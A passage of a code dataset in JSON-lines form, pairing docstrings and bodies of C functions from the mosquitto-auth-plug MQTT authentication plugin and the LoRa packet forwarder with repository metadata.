817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Return T/F if user is superuser\n */\n", "func_signal": "int be_ldap_superuser(void *handle, const char *username)", "code": "{\n\tstruct ldap_backend *conf = (struct ldap_backend *)handle;\n\tprintf(\"%s\\n\", conf->ldap_uri);\n\n\treturn BACKEND_DEFER;\n}", "path": "mosquitto-auth-plug/be-ldap.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Check access to topic for username. Look values for a key \"acl:username\"\n * and use mosquitto_topic_matches_sub() to validate the topic.\n */\n", "func_signal": "int be_psk_access(void *handle, const char *username, char *topic)", "code": "{\n\tstruct psk_backend *conf = (struct psk_backend *)handle;\n\tint found = 0;\n\n\tif (!conf || !username || !topic)\n\t\treturn (0);\n\n\treturn (found > 0);\n}", "path": "mosquitto-auth-plug/be-psk.c", "commit_date": "2017-10-06 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Return T/F if user is superuser\n */\n", "func_signal": "int be_mysql_superuser(void *handle, const char *username)", "code": "{\n\tstruct mysql_backend *conf = (struct mysql_backend *)handle;\n\tchar *query = NULL, *u = NULL;\n\tlong nrows, ulen;\n\tint issuper = BACKEND_DEFER;\n\tMYSQL_RES *res = NULL;\n\tMYSQL_ROW rowdata;\n\n\n\tif (!conf || !conf->superquery)\n\t\treturn BACKEND_DEFER;\n\n\tif (mysql_ping(conf->mysql)) {\n\t\tfprintf(stderr, \"%s\\n\", mysql_error(conf->mysql));\n\t\tif (!auto_connect(conf)) {\n\t\t\treturn (BACKEND_ERROR);\n\t\t}\n\t}\n\tif ((u = escape(conf, username, &ulen)) == NULL)\n\t\treturn (BACKEND_ERROR);\n\n\tif ((query = malloc(strlen(conf->superquery) + ulen + 128)) == NULL) {\n\t\tfree(u);\n\t\treturn (BACKEND_ERROR);\n\t}\n\tsprintf(query, conf->superquery, u);\n\tfree(u);\n\n\tif (mysql_query(conf->mysql, query)) {\n\t\tfprintf(stderr, \"%s\\n\", mysql_error(conf->mysql));\n\t\tissuper = BACKEND_ERROR;\n\t\tgoto out;\n\t}\n\tres = mysql_store_result(conf->mysql);\n\tif ((nrows = mysql_num_rows(res)) != 1) {\n\t\tgoto out;\n\t}\n\tif (mysql_num_fields(res) != 1) {\n\t\t//DEBUG fprintf(stderr, \"numfields not ok\\n\");\n\t\tgoto out;\n\t}\n\tif ((rowdata = mysql_fetch_row(res)) == NULL) {\n\t\tgoto out;\n\t}\n\tissuper = (atoi(rowdata[0])) ? BACKEND_ALLOW: BACKEND_DEFER;\n\nout:\n\n\tmysql_free_result(res);\n\tfree(query);\n\n\treturn (issuper);\n}", "path": "mosquitto-auth-plug/be-mysql.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Return T/F if user is superuser\n */\n", "func_signal": "int be_pg_superuser(void *handle, const char *username)", "code": "{\n\tstruct pg_backend *conf = (struct pg_backend *)handle;\n\tchar *v = NULL;\n\tlong nrows;\n\tint issuper = BACKEND_DEFER;\n\tPGresult *res = NULL;\n\n\t_log(LOG_DEBUG, \"SUPERUSER: %s\", username);\n\n\tif (!conf || !conf->superquery || !username || !*username)\n\t\treturn BACKEND_DEFER;\n\n\t//query for postgres $1 instead of % s\n\tconst char *values[1] = {username};\n\tint lengths[1] = {strlen(username)};\n\tint binary[1] = {0};\n\n\tres = PQexecParams(conf->conn, conf->superquery, 1, NULL, values, lengths, binary, 0);\n\n\tif (PQresultStatus(res) != PGRES_TUPLES_OK) {\n\t\tfprintf(stderr, \"%s\\n\", PQresultErrorMessage(res));\n\t\tissuper = BACKEND_ERROR;\n\t\t//try to reset connection if failing because of database connection lost\n\t\tif(PQstatus(conf->conn) == CONNECTION_BAD){\n\t\t\t_log(LOG_NOTICE, \"Noticed a postgres connection loss. Trying to reconnect ...\\n\");\n\t\t\t//try to reinitiate the database connection\n\t\t\tPQreset(conf->conn);\n\t\t}\n\n\t\tgoto out;\n\t}\n\tif ((nrows = PQntuples(res)) != 1) {\n\t\tgoto out;\n\t}\n\tif (PQnfields(res) != 1) {\n\t\t//DEBUG fprintf(stderr, \"numfields not ok\\n\");\n\t\tgoto out;\n\t}\n\tif ((v = PQgetvalue(res, 0, 0)) == NULL) {\n\t\tgoto out;\n\t}\n\tissuper = (atoi(v)) ? BACKEND_ALLOW : BACKEND_DEFER;\n\n\nout:\n\t_log(LOG_DEBUG, \"user is %d\", issuper);\n\n\tPQclear(res);\n\n\treturn (issuper);\n}", "path": "mosquitto-auth-plug/be-postgres.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Return value for key or NULL.\n * Returned value MUST NOT be freed by caller.\n */\n", "func_signal": "char *p_stab(const char *key)", "code": "{\n\tstruct my_opts *mo;\n\n\tHASH_FIND_STR(globalopts, key, mo);\n\n\treturn ( (mo) ? mo->value : NULL);\n}", "path": "mosquitto-auth-plug/hash.c", "commit_date": "2017-07-11 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/* granted is what Mosquitto auth-plug actually granted\n */\n", "func_signal": "void auth_cache(const char *username, const char *password, int granted, void *userdata)", "code": "{\n\tchar *data;\n\tchar hex[SHA_DIGEST_LENGTH * 2 + 1];\n\tstruct cacheentry *a, *tmp;\n\tstruct userdata *ud = (struct userdata *)userdata;\n\ttime_t cacheseconds = ud->auth_cacheseconds;\n\ttime_t now;\n\n\tif (ud->auth_cacheseconds <= 0) {\n\t\treturn;\n\t}\n\n\tif (ud->auth_cachejitter > 0) {\n\t\tcacheseconds += rand() * (ud->auth_cachejitter * 2) / RAND_MAX - ud->auth_cachejitter;\n\t\tif (cacheseconds <= 0) {\n\t\t\treturn;\n\t\t}\n\t}\n\n\tif (!username || !password) {\n\t\treturn;\n\t}\n\n\tnow = time(NULL);\n\n\tdata = malloc(strlen(username) + strlen(password) + 2);\n\tsprintf(data, \"%s:%s\", username, password);\n\thexify(data, hex);\n\tfree(data);\n\n\tHASH_FIND_STR(ud->authcache, hex, a);\n\tif (a) {\n\t\ta->granted = granted;\n\n\t\tif (time(NULL) > a->expire_time) {\n\t\t\t_log(LOG_DEBUG, \" Expired [%s] for (%s)\", hex, username);\n\t\t\tHASH_DEL(ud->authcache, a);\n\t\t\tfree(a);\n\t\t}\n\t} else {\n\t\ta = (struct cacheentry *)malloc(sizeof(struct cacheentry));\n\t\tstrcpy(a->hex, hex);\n\t\ta->granted = granted;\n\t\ta->expire_time = now + cacheseconds;\n\n\t\tHASH_ADD_STR(ud->authcache, hex, a);\n\t\t_log(LOG_DEBUG, \" Cached  [%s] for (%s)\", hex, username);\n\t}\n\n\t/*\n\t * Check whole cache for items which need deleting. Important with\n\t * clients who show up once only (mosquitto_[sp]ub with variable clientIDs\n\t */\n\n\tHASH_ITER(hh, ud->authcache, a, tmp) {\n\t\tif (now > a->expire_time) {\n\t\t\t_log(LOG_DEBUG, \" Cleanup [%s]\", a->hex);\n\t\t\tHASH_DEL(ud->authcache, a);\n\t\t\tfree(a);\n\t\t}\n\t}\n}", "path": "mosquitto-auth-plug/cache.c", "commit_date": "2017-12-14 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * (user)[ \\t]+([^ \\t]+) (topic|pattern)[ \\t]+(read|write)?[ \\t][^ \\t]+\n */\n", "func_signal": "static bool read_acl(be_files * conf, FILE * file)", "code": "{\n\tchar line[512];\n\tchar *pos;\n\tchar *username;\n\tacl_entry *entry;\n\tpwd_entry *pwd = NULL;\n\n\twhile (fgets(line, sizeof(line), file) != NULL) {\n\t\tif (line[0] == '#')\n\t\t\tcontinue;\n\t\tfor (pos = line; *pos != '\\0' && (*pos == ' ' || *pos == '\\t'); ++pos);\n\t\tif (*pos == '\\r' || *pos == '\\n')\n\t\t\tcontinue;\n\t\tif (strncmp(\"user\", pos, 4) == 0) {\n\t\t\tfor (pos = pos + 4; (*pos == ' ' || *pos == '\\t') && *pos != '\\0'; ++pos);\n\t\t\tusername = pos;\n\t\t\tpos = strchr(username, '\\r');\n\t\t\tif (pos != NULL)\n\t\t\t\t*pos = '\\0';\n\t\t\tpos = strchr(username, '\\n');\n\t\t\tif (pos != NULL)\n\t\t\t\t*pos = '\\0';\n\t\t\tpwd = find_pwd(conf, username);\n\t\t\tif (pwd == NULL) {\n\t\t\t\tpwd = (pwd_entry *) malloc(sizeof(pwd_entry));\n\t\t\t\tdllist_entry_init(&pwd->entry);\n\t\t\t\tdllist_init(&pwd->acl_entries);\n\t\t\t\tpwd->username = strdup(username);\n\t\t\t\tpwd->password = NULL;\n\t\t\t\tdllist_push_back(&conf->passwords, &pwd->entry);\n\t\t\t}\n\t\t} else if (strncmp(\"topic\", pos, 5) == 0) {\n\t\t\tfor (pos = pos + 5; (*pos == ' ' || *pos == '\\t') && *pos != '\\0'; ++pos);\n\t\t\tentry = read_acl_line(pos);\n\t\t\tif (pwd != NULL)\n\t\t\t\tdllist_push_back(&pwd->acl_entries, &entry->entry);\n\t\t\telse\n\t\t\t\tdllist_push_back(&acl_entries, &entry->entry);\n\t\t} else if (strncmp(\"pattern\", pos, 7) == 0) {\n\t\t\tfor (pos = pos + 7; (*pos == ' ' || *pos == '\\t') && *pos != '\\0'; ++pos);\n\t\t\tentry = read_acl_line(pos);\n\t\t\tdllist_push_back(&acl_entries, &entry->entry);\n\t\t} else {\n\t\t\tLOG(MOSQ_LOG_WARNING, \"failed to parse line: %s\", line);\n\t\t}\n\t}\n\treturn true;\n}", "path": "mosquitto-auth-plug/be-files.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/* Return processed contents of a string between quotes and\n   skips passed argument to a matching quote. */\n", "func_signal": "static char * get_quoted_string(const char **string)", "code": "{\n    const char *string_start = *string;\n    size_t string_len = 0;\n    skip_quotes(string);\n    if (**string == '\\0')\n        return NULL;\n    string_len = *string - string_start - 2; /* length without quotes */\n    return process_string(string_start + 1, string_len);\n}", "path": "packet_forwarder/lora_pkt_fwd/src/parson.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/packet_forwarder", "stars": 697, "license": "other", "language": "c", "size": 756}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- MAIN FUNCTION -------------------------------------------------------- */\n", "func_signal": "int main(void)", "code": "{\n    struct sigaction sigact; /* SIGQUIT&SIGINT&SIGTERM signal handling */\n    int i; /* loop variable and temporary variable for return value */\n    int x;\n\n    /* configuration file related */\n    char *global_cfg_path= \"global_conf.json\"; /* contain global (typ. network-wide) configuration */\n    char *local_cfg_path = \"local_conf.json\"; /* contain node specific configuration, overwrite global parameters for parameters that are defined in both */\n    char *debug_cfg_path = \"debug_conf.json\"; /* if present, all other configuration files are ignored */\n\n    /* threads */\n    pthread_t thrid_up;\n    pthread_t thrid_down;\n    pthread_t thrid_gps;\n    pthread_t thrid_valid;\n    pthread_t thrid_jit;\n    pthread_t thrid_timersync;\n\n    /* network socket creation */\n    struct addrinfo hints;\n    struct addrinfo *result; /* store result of getaddrinfo */\n    struct addrinfo *q; /* pointer to move into *result data */\n    char host_name[64];\n    char port_name[64];\n\n    /* variables to get local copies of measurements */\n    uint32_t cp_nb_rx_rcv;\n    uint32_t cp_nb_rx_ok;\n    uint32_t cp_nb_rx_bad;\n    uint32_t cp_nb_rx_nocrc;\n    uint32_t cp_up_pkt_fwd;\n    uint32_t cp_up_network_byte;\n    uint32_t cp_up_payload_byte;\n    uint32_t cp_up_dgram_sent;\n    uint32_t cp_up_ack_rcv;\n    uint32_t cp_dw_pull_sent;\n    uint32_t cp_dw_ack_rcv;\n    uint32_t cp_dw_dgram_rcv;\n    uint32_t cp_dw_network_byte;\n    uint32_t cp_dw_payload_byte;\n    uint32_t cp_nb_tx_ok;\n    uint32_t cp_nb_tx_fail;\n    uint32_t cp_nb_tx_requested = 0;\n    uint32_t cp_nb_tx_rejected_collision_packet = 0;\n    uint32_t cp_nb_tx_rejected_collision_beacon = 0;\n    uint32_t cp_nb_tx_rejected_too_late = 0;\n    uint32_t cp_nb_tx_rejected_too_early = 0;\n    uint32_t cp_nb_beacon_queued = 0;\n    uint32_t cp_nb_beacon_sent = 0;\n    uint32_t cp_nb_beacon_rejected = 0;\n\n    /* GPS coordinates variables */\n    bool coord_ok = false;\n    struct coord_s cp_gps_coord = {0.0, 0.0, 0};\n\n    /* SX1301 data variables */\n    uint32_t trig_tstamp;\n\n    /* statistics variable */\n    time_t t;\n    char stat_timestamp[24];\n    float rx_ok_ratio;\n    float rx_bad_ratio;\n    float rx_nocrc_ratio;\n    float up_ack_ratio;\n    float dw_ack_ratio;\n\n    /* display version informations */\n    MSG(\"*** Beacon Packet Forwarder for Lora Gateway ***\\nVersion: \" VERSION_STRING \"\\n\");\n    MSG(\"*** Lora concentrator HAL library version info ***\\n%s\\n***\\n\", lgw_version_info());\n\n    /* display host endianness */\n    #if __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__\n        MSG(\"INFO: Little endian host\\n\");\n    #elif __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__\n        MSG(\"INFO: Big endian host\\n\");\n    #else\n        MSG(\"INFO: Host endianness unknown\\n\");\n    #endif\n\n    /* load configuration files */\n    if (access(debug_cfg_path, R_OK) == 0) { /* if there is a debug conf, parse only the debug conf */\n        MSG(\"INFO: found debug configuration file %s, parsing it\\n\", debug_cfg_path);\n        MSG(\"INFO: other configuration files will be ignored\\n\");\n        x = parse_SX1301_configuration(debug_cfg_path);\n        if (x != 0) {\n            exit(EXIT_FAILURE);\n        }\n        x = parse_gateway_configuration(debug_cfg_path);\n        if (x != 0) {\n            exit(EXIT_FAILURE);\n        }\n    } else if (access(global_cfg_path, R_OK) == 0) { /* if there is a global conf, parse it and then try to parse local conf  */\n        MSG(\"INFO: found global configuration file %s, parsing it\\n\", global_cfg_path);\n        x = parse_SX1301_configuration(global_cfg_path);\n        if (x != 0) {\n            exit(EXIT_FAILURE);\n        }\n        x = parse_gateway_configuration(global_cfg_path);\n        if (x != 0) {\n            exit(EXIT_FAILURE);\n        }\n        if (access(local_cfg_path, R_OK) == 0) {\n            MSG(\"INFO: found local configuration file %s, parsing it\\n\", local_cfg_path);\n            MSG(\"INFO: redefined parameters will overwrite global parameters\\n\");\n            parse_SX1301_configuration(local_cfg_path);\n            parse_gateway_configuration(local_cfg_path);\n        }\n    } else if (access(local_cfg_path, R_OK) == 0) { /* if there is only a local conf, parse it and that's all */\n        MSG(\"INFO: found local configuration file %s, parsing it\\n\", local_cfg_path);\n        x = parse_SX1301_configuration(local_cfg_path);\n        if (x != 0) {\n            exit(EXIT_FAILURE);\n        }\n        x = parse_gateway_configuration(local_cfg_path);\n        if (x != 0) {\n            exit(EXIT_FAILURE);\n        }\n    } else {\n        MSG(\"ERROR: [main] failed to find any configuration file named %s, %s OR %s\\n\", global_cfg_path, local_cfg_path, debug_cfg_path);\n        exit(EXIT_FAILURE);\n    }\n\n    /* Start GPS a.s.a.p., to allow it to lock */\n    if (gps_tty_path[0] != '\\0') { /* do not try to open GPS device if no path set */\n        i = lgw_gps_enable(gps_tty_path, \"ubx7\", 0, &gps_tty_fd); /* HAL only supports u-blox 7 for now */\n        if (i != LGW_GPS_SUCCESS) {\n            printf(\"WARNING: [main] impossible to open %s for GPS sync (check permissions)\\n\", gps_tty_path);\n            gps_enabled = false;\n            gps_ref_valid = false;\n        } else {\n            printf(\"INFO: [main] TTY port %s open for GPS synchronization\\n\", gps_tty_path);\n            gps_enabled = true;\n            gps_ref_valid = false;\n        }\n    }\n\n    /* get timezone info */\n    tzset();\n\n    /* sanity check on configuration variables */\n    // TODO\n\n    /* process some of the configuration variables */\n    net_mac_h = htonl((uint32_t)(0xFFFFFFFF & (lgwm>>32)));\n    net_mac_l = htonl((uint32_t)(0xFFFFFFFF &  lgwm  ));\n\n    /* prepare hints to open network sockets */\n    memset(&hints, 0, sizeof hints);\n    hints.ai_family = AF_INET; /* WA: Forcing IPv4 as AF_UNSPEC makes connection on localhost to fail */\n    hints.ai_socktype = SOCK_DGRAM;\n\n    /* look for server address w/ upstream port */\n    i = getaddrinfo(serv_addr, serv_port_up, &hints, &result);\n    if (i != 0) {\n        MSG(\"ERROR: [up] getaddrinfo on address %s (PORT %s) returned %s\\n\", serv_addr, serv_port_up, gai_strerror(i));\n        exit(EXIT_FAILURE);\n    }\n\n    /* try to open socket for upstream traffic */\n    for (q=result; q!=NULL; q=q->ai_next) {\n        sock_up = socket(q->ai_family, q->ai_socktype,q->ai_protocol);\n        if (sock_up == -1) continue; /* try next field */\n        else break; /* success, get out of loop */\n    }\n    if (q == NULL) {\n        MSG(\"ERROR: [up] failed to open socket to any of server %s addresses (port %s)\\n\", serv_addr, serv_port_up);\n        i = 1;\n        for (q=result; q!=NULL; q=q->ai_next) {\n            getnameinfo(q->ai_addr, q->ai_addrlen, host_name, sizeof host_name, port_name, sizeof port_name, NI_NUMERICHOST);\n            MSG(\"INFO: [up] result %i host:%s service:%s\\n\", i, host_name, port_name);\n            ++i;\n        }\n        exit(EXIT_FAILURE);\n    }\n\n    /* connect so we can send/receive packet with the server only */\n    i = connect(sock_up, q->ai_addr, q->ai_addrlen);\n    if (i != 0) {\n        MSG(\"ERROR: [up] connect returned %s\\n\", strerror(errno));\n        exit(EXIT_FAILURE);\n    }\n    freeaddrinfo(result);\n\n    /* look for server address w/ downstream port */\n    i = getaddrinfo(serv_addr, serv_port_down, &hints, &result);\n    if (i != 0) {\n        MSG(\"ERROR: [down] getaddrinfo on address %s (port %s) returned %s\\n\", serv_addr, serv_port_up, gai_strerror(i));\n        exit(EXIT_FAILURE);\n    }\n\n    /* try to open socket for downstream traffic */\n    for (q=result; q!=NULL; q=q->ai_next) {\n        sock_down = socket(q->ai_family, q->ai_socktype,q->ai_protocol);\n        if (sock_down == -1) continue; /* try next field */\n        else break; /* success, get out of loop */\n    }\n    if (q == NULL) {\n        MSG(\"ERROR: [down] failed to open socket to any of server %s addresses (port %s)\\n\", serv_addr, serv_port_up);\n        i = 1;\n        for (q=result; q!=NULL; q=q->ai_next) {\n            getnameinfo(q->ai_addr, q->ai_addrlen, host_name, sizeof host_name, port_name, sizeof port_name, NI_NUMERICHOST);\n            MSG(\"INFO: [down] result %i host:%s service:%s\\n\", i, host_name, port_name);\n            ++i;\n        }\n        exit(EXIT_FAILURE);\n    }\n\n    /* connect so we can send/receive packet with the server only */\n    i = connect(sock_down, q->ai_addr, q->ai_addrlen);\n    if (i != 0) {\n        MSG(\"ERROR: [down] connect returned %s\\n\", strerror(errno));\n        exit(EXIT_FAILURE);\n    }\n    freeaddrinfo(result);\n\n    /* starting the concentrator */\n    i = lgw_start();\n    if (i == LGW_HAL_SUCCESS) {\n        MSG(\"INFO: [main] concentrator started, packet can now be received\\n\");\n    } else {\n        MSG(\"ERROR: [main] failed to start the concentrator\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    /* spawn threads to manage upstream and downstream */\n    i = pthread_create( &thrid_up, NULL, (void * (*)(void *))thread_up, NULL);\n    if (i != 0) {\n        MSG(\"ERROR: [main] impossible to create upstream thread\\n\");\n        exit(EXIT_FAILURE);\n    }\n    i = pthread_create( &thrid_down, NULL, (void * (*)(void *))thread_down, NULL);\n    if (i != 0) {\n        MSG(\"ERROR: [main] impossible to create downstream thread\\n\");\n        exit(EXIT_FAILURE);\n    }\n    i = pthread_create( &thrid_jit, NULL, (void * (*)(void *))thread_jit, NULL);\n    if (i != 0) {\n        MSG(\"ERROR: [main] impossible to create JIT thread\\n\");\n        exit(EXIT_FAILURE);\n    }\n    i = pthread_create( &thrid_timersync, NULL, (void * (*)(void *))thread_timersync, NULL);\n    if (i != 0) {\n        MSG(\"ERROR: [main] impossible to create Timer Sync thread\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    /* spawn thread to manage GPS */\n    if (gps_enabled == true) {\n        i = pthread_create( &thrid_gps, NULL, (void * (*)(void *))thread_gps, NULL);\n        if (i != 0) {\n            MSG(\"ERROR: [main] impossible to create GPS thread\\n\");\n            exit(EXIT_FAILURE);\n        }\n        i = pthread_create( &thrid_valid, NULL, (void * (*)(void *))thread_valid, NULL);\n        if (i != 0) {\n            MSG(\"ERROR: [main] impossible to create validation thread\\n\");\n            exit(EXIT_FAILURE);\n        }\n    }\n\n    /* configure signal handling */\n    sigemptyset(&sigact.sa_mask);\n    sigact.sa_flags = 0;\n    sigact.sa_handler = sig_handler;\n    sigaction(SIGQUIT, &sigact, NULL); /* Ctrl-\\ */\n    sigaction(SIGINT, &sigact, NULL); /* Ctrl-C */\n    sigaction(SIGTERM, &sigact, NULL); /* default \"kill\" command */\n\n    /* main loop task : statistics collection */\n    while (!exit_sig && !quit_sig) {\n        /* wait for next reporting interval */\n        wait_ms(1000 * stat_interval);\n\n        /* get timestamp for statistics */\n        t = time(NULL);\n        strftime(stat_timestamp, sizeof stat_timestamp, \"%F %T %Z\", gmtime(&t));\n\n        /* access upstream statistics, copy and reset them */\n        pthread_mutex_lock(&mx_meas_up);\n        cp_nb_rx_rcv       = meas_nb_rx_rcv;\n        cp_nb_rx_ok        = meas_nb_rx_ok;\n        cp_nb_rx_bad       = meas_nb_rx_bad;\n        cp_nb_rx_nocrc     = meas_nb_rx_nocrc;\n        cp_up_pkt_fwd      = meas_up_pkt_fwd;\n        cp_up_network_byte = meas_up_network_byte;\n        cp_up_payload_byte = meas_up_payload_byte;\n        cp_up_dgram_sent   = meas_up_dgram_sent;\n        cp_up_ack_rcv      = meas_up_ack_rcv;\n        meas_nb_rx_rcv = 0;\n        meas_nb_rx_ok = 0;\n        meas_nb_rx_bad = 0;\n        meas_nb_rx_nocrc = 0;\n        meas_up_pkt_fwd = 0;\n        meas_up_network_byte = 0;\n        meas_up_payload_byte = 0;\n        meas_up_dgram_sent = 0;\n        meas_up_ack_rcv = 0;\n        pthread_mutex_unlock(&mx_meas_up);\n        if (cp_nb_rx_rcv > 0) {\n            rx_ok_ratio = (float)cp_nb_rx_ok / (float)cp_nb_rx_rcv;\n            rx_bad_ratio = (float)cp_nb_rx_bad / (float)cp_nb_rx_rcv;\n            rx_nocrc_ratio = (float)cp_nb_rx_nocrc / (float)cp_nb_rx_rcv;\n        } else {\n            rx_ok_ratio = 0.0;\n            rx_bad_ratio = 0.0;\n            rx_nocrc_ratio = 0.0;\n        }\n        if (cp_up_dgram_sent > 0) {\n            up_ack_ratio = (float)cp_up_ack_rcv / (float)cp_up_dgram_sent;\n        } else {\n            up_ack_ratio = 0.0;\n        }\n\n        /* access downstream statistics, copy and reset them */\n        pthread_mutex_lock(&mx_meas_dw);\n        cp_dw_pull_sent    =  meas_dw_pull_sent;\n        cp_dw_ack_rcv      =  meas_dw_ack_rcv;\n        cp_dw_dgram_rcv    =  meas_dw_dgram_rcv;\n        cp_dw_network_byte =  meas_dw_network_byte;\n        cp_dw_payload_byte =  meas_dw_payload_byte;\n        cp_nb_tx_ok        =  meas_nb_tx_ok;\n        cp_nb_tx_fail      =  meas_nb_tx_fail;\n        cp_nb_tx_requested                 +=  meas_nb_tx_requested;\n        cp_nb_tx_rejected_collision_packet +=  meas_nb_tx_rejected_collision_packet;\n        cp_nb_tx_rejected_collision_beacon +=  meas_nb_tx_rejected_collision_beacon;\n        cp_nb_tx_rejected_too_late         +=  meas_nb_tx_rejected_too_late;\n        cp_nb_tx_rejected_too_early        +=  meas_nb_tx_rejected_too_early;\n        cp_nb_beacon_queued   +=  meas_nb_beacon_queued;\n        cp_nb_beacon_sent     +=  meas_nb_beacon_sent;\n        cp_nb_beacon_rejected +=  meas_nb_beacon_rejected;\n        meas_dw_pull_sent = 0;\n        meas_dw_ack_rcv = 0;\n        meas_dw_dgram_rcv = 0;\n        meas_dw_network_byte = 0;\n        meas_dw_payload_byte = 0;\n        meas_nb_tx_ok = 0;\n        meas_nb_tx_fail = 0;\n        meas_nb_tx_requested = 0;\n        meas_nb_tx_rejected_collision_packet = 0;\n        meas_nb_tx_rejected_collision_beacon = 0;\n        meas_nb_tx_rejected_too_late = 0;\n        meas_nb_tx_rejected_too_early = 0;\n        meas_nb_beacon_queued = 0;\n        meas_nb_beacon_sent = 0;\n        meas_nb_beacon_rejected = 0;\n        pthread_mutex_unlock(&mx_meas_dw);\n        if (cp_dw_pull_sent > 0) {\n            dw_ack_ratio = (float)cp_dw_ack_rcv / (float)cp_dw_pull_sent;\n        } else {\n            dw_ack_ratio = 0.0;\n        }\n\n        /* access GPS statistics, copy them */\n        if (gps_enabled == true) {\n            pthread_mutex_lock(&mx_meas_gps);\n            coord_ok = gps_coord_valid;\n            cp_gps_coord = meas_gps_coord;\n            pthread_mutex_unlock(&mx_meas_gps);\n        }\n\n        /* overwrite with reference coordinates if function is enabled */\n        if (gps_fake_enable == true) {\n            cp_gps_coord = reference_coord;\n        }\n\n        /* display a report */\n        printf(\"\\n##### %s #####\\n\", stat_timestamp);\n        printf(\"### [UPSTREAM] ###\\n\");\n        printf(\"# RF packets received by concentrator: %u\\n\", cp_nb_rx_rcv);\n        printf(\"# CRC_OK: %.2f%%, CRC_FAIL: %.2f%%, NO_CRC: %.2f%%\\n\", 100.0 * rx_ok_ratio, 100.0 * rx_bad_ratio, 100.0 * rx_nocrc_ratio);\n        printf(\"# RF packets forwarded: %u (%u bytes)\\n\", cp_up_pkt_fwd, cp_up_payload_byte);\n        printf(\"# PUSH_DATA datagrams sent: %u (%u bytes)\\n\", cp_up_dgram_sent, cp_up_network_byte);\n        printf(\"# PUSH_DATA acknowledged: %.2f%%\\n\", 100.0 * up_ack_ratio);\n        printf(\"### [DOWNSTREAM] ###\\n\");\n        printf(\"# PULL_DATA sent: %u (%.2f%% acknowledged)\\n\", cp_dw_pull_sent, 100.0 * dw_ack_ratio);\n        printf(\"# PULL_RESP(onse) datagrams received: %u (%u bytes)\\n\", cp_dw_dgram_rcv, cp_dw_network_byte);\n        printf(\"# RF packets sent to concentrator: %u (%u bytes)\\n\", (cp_nb_tx_ok+cp_nb_tx_fail), cp_dw_payload_byte);\n        printf(\"# TX errors: %u\\n\", cp_nb_tx_fail);\n        if (cp_nb_tx_requested != 0 ) {\n            printf(\"# TX rejected (collision packet): %.2f%% (req:%u, rej:%u)\\n\", 100.0 * cp_nb_tx_rejected_collision_packet / cp_nb_tx_requested, cp_nb_tx_requested, cp_nb_tx_rejected_collision_packet);\n            printf(\"# TX rejected (collision beacon): %.2f%% (req:%u, rej:%u)\\n\", 100.0 * cp_nb_tx_rejected_collision_beacon / cp_nb_tx_requested, cp_nb_tx_requested, cp_nb_tx_rejected_collision_beacon);\n            printf(\"# TX rejected (too late): %.2f%% (req:%u, rej:%u)\\n\", 100.0 * cp_nb_tx_rejected_too_late / cp_nb_tx_requested, cp_nb_tx_requested, cp_nb_tx_rejected_too_late);\n            printf(\"# TX rejected (too early): %.2f%% (req:%u, rej:%u)\\n\", 100.0 * cp_nb_tx_rejected_too_early / cp_nb_tx_requested, cp_nb_tx_requested, cp_nb_tx_rejected_too_early);\n        }\n        printf(\"# BEACON queued: %u\\n\", cp_nb_beacon_queued);\n        printf(\"# BEACON sent so far: %u\\n\", cp_nb_beacon_sent);\n        printf(\"# BEACON rejected: %u\\n\", cp_nb_beacon_rejected);\n        printf(\"### [JIT] ###\\n\");\n        /* get timestamp captured on PPM pulse  */\n        pthread_mutex_lock(&mx_concent);\n        i = lgw_get_trigcnt(&trig_tstamp);\n        pthread_mutex_unlock(&mx_concent);\n        if (i != LGW_HAL_SUCCESS) {\n            printf(\"# SX1301 time (PPS): unknown\\n\");\n        } else {\n            printf(\"# SX1301 time (PPS): %u\\n\", trig_tstamp);\n        }\n        jit_print_queue (&jit_queue, false, DEBUG_LOG);\n        printf(\"### [GPS] ###\\n\");\n        if (gps_enabled == true) {\n            /* no need for mutex, display is not critical */\n            if (gps_ref_valid == true) {\n                printf(\"# Valid time reference (age: %li sec)\\n\", (long)difftime(time(NULL), time_reference_gps.systime));\n            } else {\n                printf(\"# Invalid time reference (age: %li sec)\\n\", (long)difftime(time(NULL), time_reference_gps.systime));\n            }\n            if (coord_ok == true) {\n                printf(\"# GPS coordinates: latitude %.5f, longitude %.5f, altitude %i m\\n\", cp_gps_coord.lat, cp_gps_coord.lon, cp_gps_coord.alt);\n            } else {\n                printf(\"# no valid GPS coordinates available yet\\n\");\n            }\n        } else if (gps_fake_enable == true) {\n            printf(\"# GPS *FAKE* coordinates: latitude %.5f, longitude %.5f, altitude %i m\\n\", cp_gps_coord.lat, cp_gps_coord.lon, cp_gps_coord.alt);\n        } else {\n            printf(\"# GPS sync is disabled\\n\");\n        }\n        printf(\"##### END #####\\n\");\n\n        /* generate a JSON report (will be sent to server by upstream thread) */\n        pthread_mutex_lock(&mx_stat_rep);\n        if (((gps_enabled == true) && (coord_ok == true)) || (gps_fake_enable == true)) {\n            snprintf(status_report, STATUS_SIZE, \"\\\"stat\\\":{\\\"time\\\":\\\"%s\\\",\\\"lati\\\":%.5f,\\\"long\\\":%.5f,\\\"alti\\\":%i,\\\"rxnb\\\":%u,\\\"rxok\\\":%u,\\\"rxfw\\\":%u,\\\"ackr\\\":%.1f,\\\"dwnb\\\":%u,\\\"txnb\\\":%u}\", stat_timestamp, cp_gps_coord.lat, cp_gps_coord.lon, 